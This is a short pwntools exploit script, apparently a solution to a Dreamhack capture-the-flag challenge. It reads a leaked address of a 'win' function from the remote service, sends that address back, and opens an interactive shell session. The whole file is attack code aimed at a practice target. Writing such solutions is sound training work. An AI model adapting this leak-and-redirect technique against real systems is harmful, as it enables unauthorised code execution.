from pwn import *

p = remote('host3.dreamhack.games', 18735)

p.recvuntil(b' function (')
win_addr = int(p.recvn(8), 16)

p.sendlineafter(b'name: ', b'a')
p.sendlineafter(b'hex value: ', hex(win_addr)) 
p.sendlineafter(b'integer count: ', b'4')

p.interactive()
